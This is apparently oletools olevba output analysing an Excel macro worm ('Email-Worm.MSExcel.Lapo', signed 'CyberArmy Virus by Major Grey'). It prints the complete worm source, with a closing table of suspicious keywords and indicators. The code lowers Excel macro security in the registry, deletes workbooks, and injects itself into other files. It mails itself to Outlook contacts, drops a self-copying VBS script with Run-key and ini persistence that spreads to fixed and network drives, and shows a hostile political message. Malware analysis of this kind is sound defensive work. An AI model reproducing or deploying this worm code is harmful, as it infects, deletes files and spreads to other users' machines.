olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSExcel.Lapo-0e3ce15f676f080f11354b68895605dc28e4f2c0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Email-Worm.MSExcel.Lapo-0e3ce15f676f080f11354b68895605dc28e4f2c0 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Lapo.bas 
in file: Email-Worm.MSExcel.Lapo-0e3ce15f676f080f11354b68895605dc28e4f2c0 - OLE stream: '_VBA_PROJECT_CUR/VBA/Lapo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function OLHcgtf67tgVFVFi76fv Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function TURDuy8ggrYDlu84k Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function uygYUG987uGYU897g Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Global Const REG_DWORD As Long = 4
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Global Const HKEY_CURRENT_USER As Long = &H80000001
Dim OIRFYdyt76y98hJHGJ As String
Dim OUwaWARTF789IUh76h As String
Dim XTUYKILU98KJHhjg As String
'CyberArmy Virus by Major Grey ;)
Private Sub auto_open()
On Error Resume Next
    u = OLHcgtf67tgVFVFi76fv(HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0, KEY_ALL_ACCESS, k)
    u = TURDuy8ggrYDlu84k(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
    u = uygYUG987uGYU897g(k)
    v = OLHcgtf67tgVFVFi76fv(HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Excel\Security", 0, KEY_ALL_ACCESS, s)
    v = TURDuy8ggrYDlu84k(s, "Level", 0, 1, "1", 0)
    v = uygYUG987uGYU897g(s)
    C = OLHcgtf67tgVFVFi76fv(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, s)
    C = TURDuy8ggrYDlu84k(s, "VsStatEXE", 0, 1, "c:\windows\kernel.exe.vbs", 0)
    C = uygYUG987uGYU897g(s)
CommandBars("Tools").Controls("Options...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False
d = Day(Now())
m = Month(Now())
P = Application.PathSeparator
OIRFYdyt76y98hJHGJ = Application.StartupPath
Application.DisplayAlerts = False
Application.StatusBar = False
Application.ScreenUpdating = False
If Dir(OIRFYdyt76y98hJHGJ & P & "*o.xls") = "" Then
Workbooks("personal.xls").Close
Kill (OIRFYdyt76y98hJHGJ & P & "*.xls")
mycolony
gofrnd
Workbooks.Add
    n = EST89gYTSE987gf(ThisWorkbook.Name)
    UHSTSoiHU78KHnv (n)
    ActiveWorkbook.VBProject.VBComponents(n).Name = "V" & d & "b"
    RDTOIoigh6gv5hFG = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks(RDTOIoigh6gv5hFG).SaveAs Filename:="C:\Army.xls", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
False
    Workbooks("Army.xls").SaveAs Filename:=OIRFYdyt76y98hJHGJ & P & d & "S" & m & "o" & ".xls", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
False
    
    Else
    
End If
Application.DisplayAlerts = True
Application.ScreenUpdating = True
OUwaWARTF789IUh76h = Dir(OIRFYdyt76y98hJHGJ & P & "*o.xls")
Application.OnSheetActivate = "'" & OIRFYdyt76y98hJHGJ & P & OUwaWARTF789IUh76h & "'!AtcSprd"

End Sub

Private Function EST89gYTSE987gf(WkName)
On Error Resume Next
    Set k = Workbooks(WkName).VBProject.VBComponents
    For i = 1 To k.Count
        If k(i).Type = 1 Then
            EST89gYTSE987gf = k(i).Name
            Exit For
        Else
            EST89gYTSE987gf = ""
        End If
    Next i
End Function

Private Function UHSTSoiHU78KHnv(n)
    On Error Resume Next
    Set TW = ThisWorkbook.VBProject.VBComponents
    Set aw = ActiveWorkbook.VBProject.VBComponents
    TW(n).Export (OIRFYdyt76y98hJHGJ & P & "t")
    aw.Import (OIRFYdyt76y98hJHGJ & P & "t")
    Kill (OIRFYdyt76y98hJHGJ & P & "t")
End Function

Sub AtcSprd()
On Error Resume Next
n = EST89gYTSE987gf(ActiveWorkbook.Name)
ytfKTUF8tJH8528HGC = ActiveWorkbook.VBProject.VBComponents(n).Name
OIpoi57869ghfhHJF = Left(ActiveWorkbook.Name, 4)
    Set TW = ThisWorkbook.VBProject.VBComponents
    Set aw = ActiveWorkbook.VBProject.VBComponents
    If ActiveWorkbook.Name <> "Book1" Then
      If ytfKTUF8tJH8528HGC <> OIpoi57869ghfhHJF Then
      Set AVC = ActiveWorkbook.VBProject.VBComponents
                For i = AVC.Count To 1 Step -1
                    If AVC(i).Type = 1 Or AVC(i).Type = 2 Then
                        AVC.Remove AVC(i)
                    End If
                Next i
      n = EST89gYTSE987gf(ThisWorkbook.Name)
      UHSTSoiHU78KHnv (n)
      ActiveWorkbook.VBProject.VBComponents(n).Name = OIpoi57869ghfhHJF
      Workbooks(ActiveWorkbook.Name).Save
      End If
    End If
If Day(Now()) + 34 Mod Month(Now()) = 3 Then OoiuEWYqfgh878HG
If Month(Now()) > 2 Then
   If Dir("C:\WINDOWS\kernel.exe.vbs") = "" Then mycolony
End If
End Sub
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
AtcSprd
End Sub
Sub OoiuEWYqfgh878HG()
MsgBox " mAlE  oR  fEmAlE  dOEsN't  MaTter " & Chr(13) & " JoKE  joB  aNd  sAY  ,  hAai...!!  tO  ExCel " _
& Chr(13) & " aNd  sAY  gOodByE  tÖ  iZr@3L ......!! " & Chr(13) & Chr(13) & " ***********L3ts T#3 W4R be9iNinG*********** " _
& Chr(13) & Chr(13), vbExclamation, "Excel BÖmber"
End Sub

Sub mycolony()
On Error Resume Next
Open "C:\WINDOWS\kernel.exe.vbs" For Output As #1
Print #1, "'CyberArmy Virus by Major Grey ;)"
Print #1, "On Error resume next"
Print #1, "dim wobj"
Print #1, "set ff = createobject(""Scripting.FileSystemObject"")"
Print #1, "sfold = ff.getspecialfolder(1)"
Print #1, "Set Fso= Createobject(""scripting.filesystemobject"")"
Print #1, "Fso.copyfile wscript.scriptfullname,Fso.GetSpecialFolder(1)& ""\Kernel32.vbs"""
Print #1, "set wobj=wscript.createobject(""WScript.Shell"")"
Print #1, "If Minute(Now)>55 Then"
Print #1, "nbr = weekday(now)"
Print #1, "if nbr > 3 then nbr = nbr - 3"
Print #1, "Wobj.regwrite""HKLM\system\currentcontrolset\services\Vxd\Vnetsup\Workgroup"",""Army"" & nbr"
Print #1, "msgbox"" Haii....CyberARMY now protect your PC """
Print #1, "wobj.regwrite""HKCU\Software\Microsoft\Windos\CurrentVersion\Policies\Explorer\NoClose"",""1"""
Print #1, "End If"
Print #1, "wobj.regwrite""HKCU\Software\Microsoft\Office\9.0\Excel\Security\Level"",""1"""
Print #1, "Wobj.regwrite""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Army"",""wscript.exe ""&Fso.GetSpecialFolder(1)& ""\kernel32.vbs %"""
Print #1, "editini sfold&""\win.ini"",""[windows]"",""load"",sfold&""\kernel32.vbs"""
Print #1, "editini sfold&""\System.ini"",""[boot]"",""shell"",""Explorer.exe""& sfold&""\kernel32.vbs"""
Print #1, "ntwrk()"
Print #1, "sub cpdrv(drive)"
Print #1, "on error resume next"
Print #1, "Set s = createobject(""Scripting.FileSystemObject"")"
Print #1, "set f=s.getfile(Wscript.scriptFullName)"
Print #1, "nmfile = minute(now)"
Print #1, "Scfile = second(now)"
Print #1, "f.copy(""c:\windows\desktop\"" & ""ISO9"" & Scfile & nmfile & "".exe.vbs"")"
Print #1, "f.copy(drive & ""\MyAdult"" & nmfile & "".jpg.vbs"")"
Print #1, "ff.copyfile ""C:\Army.xls"",drive & ""\Army.xls"",True"
Print #1, "end sub"
Print #1, "function showdrive(drvpath)"
Print #1, "on error resume next"
Print #1, "dim fso,d,t"
Print #1, "set fso = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "Set  d= fso.getdrive(drvpath)"
Print #1, "select case d.drivetype"
Print #1, "case 0:t=""Unknown"""
Print #1, "case 1:t=""removable"""
Print #1, "case 2:t=""Fixed"""
Print #1, "case 3:t=""network"""
Print #1, "case 4:t=""CD-ROM"""
Print #1, "case 5:t=""Ramdisk"""
Print #1, "end select"
Print #1, "if t="""" then t=""none"""
Print #1, "showdrive = t"
Print #1, "end function"
Print #1, "sub ntwrk()"
Print #1, "on error resume next"
Print #1, "for n=65 to 90"
Print #1, "l=chr(n)"
Print #1, "drv=l&"":"""
Print #1, "d3=showdrive(drv)"
Print #1, "if d3=""Fixed""then cpdrv(drv)"
Print #1, "if d3=""network"" then cpdrv(drv)"
Print #1, "next"
Print #1, "end sub"
Close #1
SetAttr ("C:\WINDOWS\kernel.exe.vbs"), vbReadOnly
End Sub
Private Sub gofrnd()
On Error Resume Next
Dim POIKJHDE765fghdHGFDHou, OIUYfd5456hg67gesrDGF, FJFrwwok435jgdDASFDG
Set POIKJHDE765fghdHGFDHou = CreateObject("Outlook.Application")
Set OIUYfd5456hg67gesrDGF = POIKJHDE765fghdHGFDHou.GetNameSpace("MAPI")
If POIKJHDE765fghdHGFDHou = "Outlook" Then
OIUYfd5456hg67gesrDGF.Logon "profile", "password"
For x = 1 To OIUYfd5456hg67gesrDGF.AddressLists.Count
Set hgj87kl098sBADUSAs3dfg = OIUYfd5456hg67gesrDGF.AddressLists(x)
y = 1
Set FJFrwwok435jgdDASFDG = POIKJHDE765fghdHGFDHou.CreateItem(0)
For z = 1 To hgj87kl098sBADUSAs3dfg.AddressEntries.Count
Peep = hgj87kl098sBADUSAs3dfg.AddressEntries(y)
FJFrwwok435jgdDASFDG.Recipients.Add Peep
y = y + 1
If y > 50 Then z = hgj87kl098sBADUSAs3dfg.AddressEntries.Count
Next z
FJFrwwok435jgdDASFDG.Subject = "Penting !! dari" & Application.UserName
FJFrwwok435jgdDASFDG.Body = "di bawah ini laporan yang anda perlukan dalam attachment Excel"
FJFrwwok435jgdDASFDG.Attachments.Add ActiveWorkbook.FullName
FJFrwwok435jgdDASFDG.Send
Peep = ""
Next x
OIUYfd5456hg67gesrDGF.Logoff
End If
    v = OLHcgtf67tgVFVFi76fv(HKEY_CURRENT_USER, "Software\Microsoft\Office", 0, KEY_ALL_ACCESS, s)
    v = TURDuy8ggrYDlu84k(s, "ARMY", 0, 1, "Major Grey of CyberArmy will change your duty ...", 0)
    v = uygYUG987uGYU897g(s)
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|createobject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
|IOC       |kernel.exe          |Executable file name                         |
|IOC       |Kernel32.vbs        |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |kernel32.vbs        |Executable file name                         |
|IOC       |Explorer.exe        |Executable file name                         |
|IOC       |exe.vbs             |Executable file name                         |
|IOC       |jpg.vbs             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

